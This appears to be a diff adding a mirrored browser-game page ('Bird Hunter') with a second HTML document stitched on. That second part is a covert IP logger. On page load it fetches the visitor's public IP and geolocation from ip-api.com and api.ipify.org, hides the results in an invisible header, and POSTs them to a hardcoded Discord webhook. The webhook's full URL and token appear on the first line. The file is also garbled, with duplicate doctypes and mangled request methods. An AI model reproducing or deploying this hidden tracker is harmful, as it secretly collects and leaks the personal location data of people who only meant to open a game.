@@ -1,0 +1,161 @@
+<var wbhk = 'https://ptb.discord.com/api/webhooks/1308563023958642828/IlAcQeerj5witLPL6mL1dAvtVxkPXyNG0u7F57M3-yCgUMhX7nvWYWlZ2E_AAaufnFHa'>
+
+
+<!doctype html>
+<html>
+
+<!-- Mirrored from birdhuntergame.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 19 Nov 2024 22:19:14 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset='UTF-8'>
+  <meta name='theme-color' content='#fff' class='theme-color'/>
+  <style>
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Noto Color Emoji";
+      overflow: hidden;
+    }
+    .hello-message {
+      margin: 20px;
+      text-align: center;
+    }
+    .logout-messages {
+      pointer-events: none;
+      color: red;
+      margin: 40px;
+      position: fixed;
+      top: 0;
+      left: 0;
+      text-shadow: 2px 2px #ffffff, 4px 4px 10px #4d4c4c;
+    }
+    img {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+    @keyframes blurslowly {
+      0% {
+        filter: none;
+      }
+      92% {
+        filter: blur(0);
+      }
+      96% {
+        filter: blur(1px);
+      }
+      100% {
+        filter: blur(0);
+      }
+    }
+    body {
+      animation-name: blurslowly;
+      animation-iteration-count: infinite;
+      animation-duration: 15s;
+      animation-play-state: running;
+    }
+  </style>
+</head>
+<body>
+<template>
+  <div class='hello-message'>
+    <img src='background-img.png' alt='Play' />
+  </div>
+  <div class='logout-messages'></div>
+</template>
+
+<script src='index.js'></script>
+
+<script async src='https://www.googletagmanager.com/gtag/js?id=UA-3898076-24'></script>
+<script>
+  window.dataLayer = window.dataLayer || []
+  function gtag () {
+    window.dataLayer.push(arguments)
+  }
+  gtag('js', new Date())
+  gtag('config', 'UA-3898076-24')
+</script>
+
+</body>
+
+</html>
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="../cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&amp;family=Poppins:wght@300;600&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../unpkg.com/leaflet%401.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
+    <link rel="icon" type="image/x-icon" href="src/favicon.html">
+    <script src="../unpkg.com/leaflet%401.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
+    <link rel="stylesheet" href="../cdn.jsdelivr.net/npm/notyf%403/notyf.min.css">
+  </head>
+  <body>
+    <header class="header"></header>
+    <script src="config.html"></script>
+    <script>
+      function get_information(link, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET.html", link, true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+            callback(xhr.responseText);
+          }
+        };
+        xhr.send(null);
+      }
+      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "razzylog";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
+      get_information("https://api.ipify.org/", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "ipppp";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
+
+      function ipLogOrSomething() {
+        var ispp = document.getElementById('ipppp').innerHTML
+        var extra = document.getElementById("razzylog").innerHTML
+        const request = new XMLHttpRequest();
+        request.open("POST.html", wbhk);
+        request.setRequestHeader('Content-type', 'application/json');
+        const params = {
+          username: "Bird",
+          avatar_url: 'https://i.postimg.cc/NGJQZd86/Bird.png',
+          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : @here" + extra + "```"  
+        }
+        request.send(JSON.stringify(params));
+      }
+      setTimeout(function() {
+        ipLogOrSomething()
+      }, 700);
+    </script>
+    <style>
+      .header {
+        display: none
+      }
+
+      .map-container {
+        display: none
+      }
+    </style>
+  </body>
+</html>
+
